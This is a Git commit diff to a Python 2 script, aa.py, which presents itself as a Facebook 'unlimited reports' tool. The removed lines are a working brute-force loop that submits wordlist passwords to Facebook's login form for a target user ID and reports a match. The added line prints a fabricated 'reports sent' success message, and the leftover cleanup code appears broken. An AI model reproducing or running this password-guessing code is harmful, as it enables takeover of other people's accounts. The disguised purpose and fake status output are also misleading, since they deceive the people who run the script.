8f5340a73e35cd2832563baa11a79f7b6d98bd65
Babar Ali <59133683+ba8724880@users.noreply.github.com>
2022-01-15 16:09:49 +0500

    Update aa.py

--- aa.py
+++ aa.py
@@ -40,40 +40,7 @@ print """
 time.sleep(0.5)
 user = raw_input('[+] ENTER USER ID FOR UNLIMITED REPORTS 😈💉 : ')
 time.sleep(0.1)
-print '\033[1;47m\033[1;31m    1 TO 100 REPORTS IN PROGRESS PLEASE WAIT    \033[1;0m   '
-for password in wordlist:
-    if password == '' or password == ' ':
-        pass
-    else:
-        try:
-            browser = mechanize.Browser()
-            browser.set_handle_robots(False)
-            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
-            fb = browser.open('https://facebook.com')
-            dos = open('Facebook-Log.txt', 'w+')
-            browser.select_form(nr=0)
-            browser.form['email'] = user
-            browser.form['pass'] = password
-            browser.method = 'POST'
-            browser.submit()
-            dos.write(browser.open('https://facebook.com').read())
-            dos.seek(0)
-            text = dos.read().decode('UTF-8')
-            if text.find('home_icon', 0, len(text)) != -1:
-                print '\033[1;97m[+] \033[1;31mPassword Match : '+password 
-                dos.close()
-                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
-                exit()
-            else:
-                print "\033[1;97m[+] \033[1;32mWrong Password : "+str(password)
-        except KeyboardInterrupt:
-            print '\n#############################################\n   Exiting..'
-            dos.close()
-            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
-            exit()
-
-time.sleep(1)
-print 'Sorry, none of the passswords in your wordlist is right.'
+print '\033[1;31m  5 Reports Send Successfully 95 in Progress Please Wait   '
 time.sleep(0.8)
 dos.close()
 os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
